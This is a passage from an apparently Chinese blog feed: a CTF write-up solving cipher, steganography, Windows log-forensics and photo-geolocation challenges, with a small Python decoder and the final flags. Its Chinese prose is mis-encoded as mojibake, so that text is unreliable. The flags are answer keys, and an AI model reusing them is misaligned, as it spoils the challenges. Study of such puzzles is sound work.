class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯å¦‚ä¸Šã€‚å››äº”å…­æœ‰ä¸‰ç§å˜åŒ–ï¼ŒçŒœè«æ–¯å¯†ç </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">..--.-</span> <span class="string">..-.</span> <span class="params">---</span> <span class="string">..-</span> -. -<span class="string">..</span> <span class="string">..--.-</span> <span class="string">.-</span> <span class="string">.-..</span> <span class="string">.-..</span> <span class="string">..--.-</span> - <span class="string">....</span> . <span class="string">..--.-</span> <span class="string">.--.</span> <span class="string">..</span> . -<span class="string">.-.</span> . <span class="string">...</span> <span class="string">..--.-</span> <span class="string">.-</span> -. -<span class="string">..</span></span><br></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_FOUND_ALL_THE_PIECES_AND</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">SICTF</span><span class="template-variable">&#123;Congratulation_to_you!_found_all_the_pieces_and_put_it_all_together&#125;</span></span><br></pre></td></tr></table></figure><h3 id="WHOWHOWHO">WHOWHOWHO</h3><p>åˆæ˜¯æœ‰å¯†ç çš„å‹ç¼©åŒ…,ä½†æ˜¯æœ‰æç¤ºï¼š6ä½æ•°å°å†™å¯†ç ï¼Œçˆ†ç ´ï¼šqweqwe</p><p>äºŒå·ä½ç½®æœ‰ç©ºç™½å­—ç¬¦ï¼Œå¾ˆæ˜æ˜¾æ˜¯0å®½éšå†™,ç½‘ä¸Šæ‰¾å·¥å…·è§£å¯†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K</span>+/<span class="number">0</span>J16ELU8WVQydohw4P5+<span class="number">2</span>M</span><br><span class="line"><span class="attribute">jbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL</span>/WP4PCMaOJHAW3HR</span><br><span class="line"><span class="attribute">b7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE</span>=</span><br></pre></td></tr></table></figure><p>base64ï¼Œæœ‰ä¸‰è¡Œï¼Œç›´æ¥è§£å¯†ï¼Œè§£å®Œå‘ç°æ˜¯ä¹±ç ï¼Œä½†æ˜¯ä¸€å¼€å¤´è¯´saltedï¼ŒåŠ ç›äº†</p><p>ä¸Šç½‘æŸ¥æ—¶å‘ç°rabbitåŠ å¯†å¼€å¤´ä¸€å®šæ˜¯U2FsdGVkX1ï¼Œbase64ä¹‹åå°±æ˜¯salted_æ‰€ä»¥å°è¯•ç”¨è¿™ä¸ªè§£å¯†ï¼Œéœ€è¦keyæ‰å¯ä»¥ï¼Œæ ¹æ®txtæ–‡ä»¶ä¸­çš„è°æ˜¯æ¸£ç”·ï¼Œå°è¯•ï¼šshumu</p><p>æˆåŠŸ</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTC<span class="built_in">A_GTAGACGTGGCGGTG</span>_GTAGACTC<span class="built_in">A_TATGACCGG</span>_GCTCGGGCT&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯dnaåŠ å¯†ï¼Œå¥½åƒæ²¡æœ‰ç›´æ¥è§£å¯†çš„ï¼Œä½†æ˜¯æœ‰è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">        <span class="string">&#x27;AAA&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;AAC&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;AAG&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;AAT&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;ACA&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;ACC&#x27;</span>:<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;ACT&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;AGA&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;AGC&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;AGG&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;AGT&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;ATA&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;ATC&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ATG&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;ATT&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;CAA&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;CAC&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;CAG&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;CAT&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;CCA&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;CCC&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;CCG&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;CCT&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;CGA&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;CGC&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;CGG&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;CGT&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;CTA&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;CTC&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;CTG&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;CTT&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;GAA&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;GAC&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;GAG&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;GAT&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;GCA&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;GCC&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;GCG&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;GCT&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;GGA&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;GGC&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;GGG&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;GGT&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;GTA&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;GTC&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;GTG&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;GTT&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;TAA&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;TAC&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;TAG&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;TAT&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;TCA&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;TCC&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;TCG&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;TCT&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;TGA&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;TGC&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;TGG&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;TGT&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;TTA&#x27;</span>:<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;TTC&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;TTG&#x27;</span>:<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;TTT&#x27;</span>:<span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>= <span class="string">&#x27;GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;&#x27;</span></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(<span class="built_in">input</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;_&#x27;</span><span class="keyword">or</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        final+=<span class="built_in">input</span>[i]</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="built_in">input</span>[i:i+<span class="number">3</span>]</span><br><span class="line">        final += mapping[tmp]</span><br><span class="line">        i+=<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"><span class="comment">#SICTF&#123;Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN&#125;</span></span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—åˆ†æ1">æ—¥å¿—åˆ†æ1</h3><p>ä½¿ç”¨äº†windowsè‡ªå¸¦çš„evtxæµè§ˆå™¨å’Œlogparser</p><p>å°è¯•æŸ¥æ‰¾æ³¨å†Œæˆ–è€…ç™»å½•ï¼šid4779</p><p>æ‰¾åˆ°</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—åˆ†æ<span class="number">1.</span>evtx<span class="number">1600</span><span class="number">2020</span><span class="number">-07</span><span class="number">-22</span> <span class="number">10</span>:<span class="number">52</span>:<span class="number">19</span><span class="number">2020</span><span class="number">-07</span><span class="number">-22</span> <span class="number">10</span>:<span class="number">52</span>:<span class="number">19</span><span class="number">4779</span><span class="number">8</span>Success Audit event<span class="number">12551</span>The name <span class="keyword">for</span> category <span class="number">12551</span> <span class="keyword">in</span> Source <span class="string">&quot;Microsoft-Windows-Security-Auditing&quot;</span> cannot be found. The <span class="built_in">local</span> computer may <span class="keyword">not</span> have <span class="keyword">the</span> necessary registry information <span class="keyword">or</span> message DLL <span class="built_in">files</span> <span class="built_in">to</span> display messages <span class="built_in">from</span> <span class="keyword">a</span> remote computerMicrosoft-Windows-Security-Auditingattack$|ADOFLMB|<span class="number">0x12a334</span>|RDP-Tcp<span class="comment">#0|kali|192.168.222.200WIN-WH8G5MDPHE5.ADoflmb.comNULLThe description for Event ID 4779 in Source &quot;Microsoft-Windows-Security-Auditing&quot; cannot be found. The local computer may not have the necessary registry information or message DLL files to display messages from a remote computerNULL</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰¾åˆ°attack$çš„ç”¨æˆ·åï¼ŒADOFLMBçš„ç”¨æˆ·åŸŸï¼Œä¸‹é¢çš„192.168.222.200æ˜¯å†…ç½‘ç™»å½•çš„ipï¼Œç„¶åæŸ¥æ‰¾åˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„idï¼š</p><p>å¾—åˆ°ä»»åŠ¡åç§°\callbackï¼Œæ–‡ä»¶è·¯å¾„c:\windows\system32\windows_attack.exe</p><p>é”å®šè¿™ä¸€å¤©å¯»æ‰¾å…¶å®ƒå†…å®¹å°±èƒ½æ‰¾åˆ°å°±èƒ½æ‰¾åˆ°ç”¨æˆ·ç»„æ˜¯Administrators</p><p>è¿œç¨‹ç™»å½•è´¦æˆ·æ˜¯WIN-WH8G5MDPHE5$</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">\callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\WIN-WH8G5MDPHE5$&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸å¯¹ï¼Œç»“æœè¿œç¨‹ç™»å½•è´¦æˆ·å°±æ˜¯attack$</p><p>åœ¨4769å·å†…å®¹2020/7/22/10ï¼š52ï¼š06</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">å·²è¯·æ±‚ Kerberos æœåŠ¡ç¥¨è¯ã€‚</span><br><span class="line"></span><br><span class="line">å¸æˆ·ä¿¡æ¯:</span><br><span class="line">å¸æˆ·å:attack$@ADOFLMB.COM</span><br><span class="line">å¸æˆ·åŸŸ:ADOFLMB.COM</span><br><span class="line">ç™»å½• GUID:&#123;7539ad21<span class="string">-0</span>be8<span class="string">-8</span>cb6<span class="string">-7406</span><span class="string">-054797</span>c14d68&#125;</span><br><span class="line"></span><br><span class="line">æœåŠ¡ä¿¡æ¯:</span><br><span class="line">æœåŠ¡åç§°:WIN-WH8G5MDPHE5$</span><br><span class="line">æœåŠ¡ ID:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-867333373</span><span class="string">-202576419</span><span class="string">-2389709931</span><span class="string">-1000</span></span><br><span class="line"></span><br><span class="line">ç½‘ç»œä¿¡æ¯:</span><br><span class="line">å®¢æˆ·ç«¯åœ°å€:::1</span><br><span class="line">å®¢æˆ·ç«¯ç«¯å£:0</span><br><span class="line"></span><br><span class="line">é™„åŠ ä¿¡æ¯:</span><br><span class="line">ç¥¨è¯é€‰é¡¹:0x40810000</span><br><span class="line">ç¥¨è¯åŠ å¯†ç±»å‹:0x12</span><br><span class="line">æ•…éšœä»£ç :0x0</span><br><span class="line">ä¼ é€’æœåŠ¡:-</span><br><span class="line"></span><br><span class="line">æ¯æ¬¡è¯·æ±‚è®¿é—®èµ„æº(ä¾‹å¦‚è®¡ç®—æœºæˆ– Windows æœåŠ¡)æ—¶ç”Ÿæˆæ­¤äº‹ä»¶ã€‚æœåŠ¡åç§°è¡¨ç¤ºè¯·æ±‚è®¿é—®çš„èµ„æºã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥é€šè¿‡æ¯”è¾ƒæ¯ä¸ªäº‹ä»¶ä¸­çš„â€œç™»å½• GUIDâ€å­—æ®µå°†æ­¤äº‹ä»¶ä¸ Windows ç™»å½•äº‹ä»¶ç›¸å…³è”ã€‚ç™»å½•äº‹ä»¶å‘ç”Ÿåœ¨è¢«è®¿é—®çš„è®¡ç®—æœºä¸Šï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œè¯¥è®¡ç®—æœºä¸æ˜¯é¢å‘æœåŠ¡ç¥¨è¯çš„åŸŸæ§åˆ¶å™¨è®¡ç®—æœºã€‚</span><br><span class="line"></span><br><span class="line">ç¥¨è¯é€‰é¡¹ã€åŠ å¯†ç±»å‹å’Œæ•…éšœä»£ç æ˜¯åœ¨ RFC 4120 ä¸­å®šä¹‰çš„ã€‚</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œå¾—åˆ°ç›®æ ‡è´¦æˆ·åï¼Œè¿™ä¸ªäº‹ä»¶æ˜¯ç”Ÿæˆå‡­è¯ä»¥è®¿é—®èµ„æºçš„æ‰€ä»¥æ²¡é—®é¢˜ï¼Ÿ</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">\callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\attack$&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œä»»åŠ¡åä¸åŠ \ï¼Œè¿™ä¸ª\è¡¨ç¤ºå®ƒä½äºä»»åŠ¡è®¡åˆ’ç¨‹åºçš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥æ­£ç¡®flagæ˜¯</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\attack$&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆæ‰€ä»¥è¯´$è¡¨ç¤ºéšè—ä¸ºä»€ä¹ˆè¦åŠ QAQï¼‰</p><h3 id="æ—¥å¿—åˆ†æ2-å¾…è¡¥å……">æ—¥å¿—åˆ†æ2[å¾…è¡¥å……]</h3><h3 id="ç¥ç§˜çš„æµé‡-å¾…è¡¥å……">ç¥ç§˜çš„æµé‡[å¾…è¡¥å……]</h3><hr><h2 id="FORENSICS">FORENSICS</h2><p>æ˜æ˜æ˜¯ç¤¾å·¥å´å«å–è¯ï¼Ÿ</p><h3 id="OSINTç­¾åˆ°">OSINTç­¾åˆ°</h3><p>ç›´æ¥æ”¾åˆ°è°·æ­Œè¯†å›¾ï¼Œå¾—å‡ºç­”æ¡ˆ</p><p>çº¢åŸæ¹–å…¬å›­ä½äºæµ·å—çœ<a href="https://baike.baidu.com/item/%E6%B5%B7%E5%8F%A3/5775?fromModule=lemma_inlink">æµ·å£</a>ç¼å±±åŒºåºœåŸè¡—é“çº¢åŸæ¹–è·¯åŒ—ä¾§</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;æµ·å—çœ<span class="literal">_</span>æµ·å£å¸‚<span class="literal">_</span>ç¼å±±åŒº<span class="literal">_</span>çº¢åŸæ¹–å…¬å›­&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿™æ‰æ˜¯ç­¾åˆ°">è¿™æ‰æ˜¯ç­¾åˆ°</h3><p>è°·æ­Œè¯†å›¾å¾—å‡ºåœ°ç‚¹æ˜¯æ„å¤§åˆ©çš„å¨å°¼æ–¯ï¼Œå›¾ç‰‡ä¸­æ˜¯ä¸€ä¸ªé…’åº—ï¼Œä½†æ˜¯æç¤ºè¯´ä¸é…’åº—ï¼Œæ‹æ‘„åœ°ç‚¹æ‰¾æ²¡æœ‰ç©ºæ ¼çš„å¥½åƒæ‰¾ä¸å‡ºæ¥ï¼Ÿ</p><p>çœ‹å¯¹è¯jpgï¼Œæ˜¯è¯´ç©¿è¿‡å°å··ï¼Œæ„Ÿè§‰å¾ˆå¤šå•Šã€‚å¥‡æ€ªè¯¶ã€‚</p><p>å¥½å§ï¼Œçœ‹äº†wpå‘ç°æ²¡æœ‰ç‰¹æ®Šå­—ç¬¦æ˜¯çœç•¥ç©ºæ ¼å°±å¯ä»¥ï¼Œé‚£æ‹æ‘„åœ°ç‚¹æ˜¯Gondola Danieli</p><p>ç©¿è¿‡å°é“ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ç†è§£æˆå¾€å·¦è¾¹èµ°ï¼Œç»“æœæ˜¯å¾€å³ï¼Ÿï¼Ÿ</p><p>ä¸è¿‡æç¤ºäº†æ¯”ä¾‹å°ºæ˜¯20mï¼Œç©·ä¸¾ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">SICTF</span><span class="template-variable">&#123;æ„å¤§åˆ©_å¨å°¼æ–¯_GondolaDanieli_ChiesadiSanZaccaria&#125;</span></span><br></pre></td></tr></table></figure><h3 id="çœŸçš„ç­¾åˆ°">çœŸçš„ç­¾åˆ°</h3><p>æ˜¾çœ¼çš„æ˜¯æ‘©å¤©è½®</p><p>è°·æ­Œè¯†å›¾æ‰¾åˆ°åœ°ç‚¹</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;å¹¿ä¸œçœ<span class="literal">_</span>ç æµ·å¸‚<span class="literal">_</span>æ–—é—¨åŒº<span class="literal">_</span>å¤§ä¿¡æ–°éƒ½æ±‡&#125;</span><br></pre></td></tr></table></figure><h3 id="æ ‘æœ¨çš„å‹è¿«">æ ‘æœ¨çš„å‹è¿«</h3><p>ç™¾åº¦è¯†å›¾åªæœç´¢çº¢æ¡†éƒ¨åˆ†</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;å››å·çœ<span class="literal">_</span>è¾¾å·å¸‚<span class="literal">_</span>é€šå·åŒº<span class="literal">_</span>å‡¤å‡°å¤§é“<span class="number">376</span>å·<span class="literal">_</span>è¾¾å·å¸‚ä½“è‚²ä¸­å¿ƒ&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾é€€">ç­¾é€€</h3><p>æ ¹æ®å·¦ä¸‹è§’è½¦æ˜¯å³èˆµï¼Œå»ç½‘ä¸Šæœç´¢åœ°åŒº</p><blockquote><p>é‡‡ç”¨å³èˆµï¼Œé å·¦è¡Œé©¶çš„å›½å®¶ä¸»è¦æ˜¯è‹±è”é‚¦å›½å®¶ï¼Œä¹Ÿå°±æ˜¯åŸæ¥å—è‹±å›½çš„å½±å“æ¯”è¾ƒå¤§çš„å›½å®¶ï¼Œè¾ƒå¤§çš„å›½å®¶æœ‰è‹±å›½ã€æ—¥æœ¬ã€å°åº¦ã€æ¾³å¤§åˆ©äºšã€å—éï¼Œç­‰ä¸‰åå¤šä¸ªå›½å®¶å’Œåœ°åŒºã€‚</p><p>å…·ä½“éƒ½åŒ…æ‹¬ï¼šå­ŸåŠ æ‹‰ã€ä¸ä¸¹ã€æ–‡è±ã€ä¸œå¸æ±¶ã€å°åº¦ã€å°åº¦å°¼è¥¿äºšã€æ—¥æœ¬ã€é©¬æ¥è¥¿äºšã€é©¬å°”ä»£å¤«ã€å°¼æ³Šå°”ã€å·´åŸºæ–¯å¦ã€æ–°åŠ å¡ã€æ–¯é‡Œå…°å¡ã€æ³°å›½ã€ä¸­å›½é¦™æ¸¯åœ°åŒºå’Œæ¾³é—¨åœ°åŒºã€çˆ±å°”å…°ã€å¡æµ¦è·¯æ–¯ã€é©¬è€³ä»–ã€è‹±å›½ã€åšèŒ¨ç“¦çº³ã€è‚¯å°¼äºšã€è±ç´¢æ‰˜ã€é©¬æ‹‰ç»´ã€æ¯›é‡Œæ±‚æ–¯ã€è«æ¡‘æ¯”å…‹ã€çº³ç±³æ¯”äºšã€å¡èˆŒå°”ã€å—éã€æ–¯å¨å£«å…°ã€å¦æ¡‘å°¼äºšã€ä¹Œå¹²è¾¾ã€èµæ¯”äºšã€æ´¥å·´å¸ƒéŸ¦ã€å®‰æç“œå’Œå·´å¸ƒè¾¾ã€å·´å“ˆé©¬ã€å·´å·´å¤šæ–¯ã€æ ¼æ—çº³è¾¾ã€åœ­äºšé‚£ã€ç‰™ä¹°åŠ ã€åœ£åŸºèŒ¨å’Œå°¼ç»´æ–¯ã€åœ£å¢è¥¿äºšã€åœ£æ–‡æ£®ç‰¹å’Œæ ¼æ—çº³ä¸æ–¯ã€è‹é‡Œå—ã€ç‰¹ç«‹å°¼è¾¾å’Œå¤šå·´å“¥ã€æ¾³å¤§åˆ©äºšã€æ–æµã€åŸºé‡Œå·´æ–¯ã€æ–°è¥¿å…°ã€å·´å¸ƒäºšæ–°å‡ å†…äºšã€æ‰€ç½—é—¨ç¾¤å²›ã€æ±¤åŠ ã€å›¾ç“¦å¢ã€‚</p></blockquote><p>é€šè¿‡ç›´æ¥æœå›¾ï¼Œå‘ç°ä¸€ä¸ªè§†é¢‘<a href="https://www.bilibili.com/video/BV1TF411E7Kj/">ã€è¶…æ¸…å—éã€‘ç¬¬ä¸€è§†è§’ å¼€è½¦ä»å¼€æ™®æ•¦æœºåœºé«˜é€Ÿå‰å¾€å¸‚ä¸­å¿ƒ (1080Pé«˜æ¸…ç‰ˆ) 2022.2_å“”å“©å“”å“©_bilibili</a></p><p>å…¶ä¸­çº¢ç»¿ç¯ä¸€æ ·ï¼Œå»ºç­‘ä¹Ÿå·®ä¸å¤šï¼Œå°±çŒœæ˜¯å¼€æ™®æ•¦äº†</p><p>åŒæ—¶è£å‰ªå›¾ç‰‡æœç´¢å³ä¸Šè§’å»ºç­‘ï¼Œå¯ä»¥å‘ç°ä¸­é—´è¢«æ¶‚æ‰çš„èœ˜è››ä¾ ã€‚é‚£ä¹ˆåœ°ç‚¹å°±æ˜¯è¿™é‡Œäº†ã€‚</p><p>æ ¹æ®è¿™ä¸ªå›¾ç‰‡ç»§ç»­æŸ¥æ‰¾ï¼Œå‘ç°è¿™ä¸ªå»ºç­‘çš„å¦ä¸€è¾¹</p><p><a href="https://www.property24.com/to-rent/cape-town-city-centre/cape-town/western-cape/9138/112975960">Commercial property to rent in Cape Town City Centre - 63 Strand Street - P24-112975960 (property24.com)</a></p><p>å¾—åˆ°é™„è¿‘åœ°å€<br>strand street</p><p>å…¨æ™¯åœ°å›¾è§‚å¯Ÿå‘ç°å°±æ˜¯è¿™é‡Œ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;å—é\_å¼€æ™®æ•¦\_StrandSt_STEERS&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-r18é¢˜ç›®å¤ç°</title>
      <link href="/posts/cc56fc8c.html"/>
      <url>/posts/cc56fc8c.html</url>
      
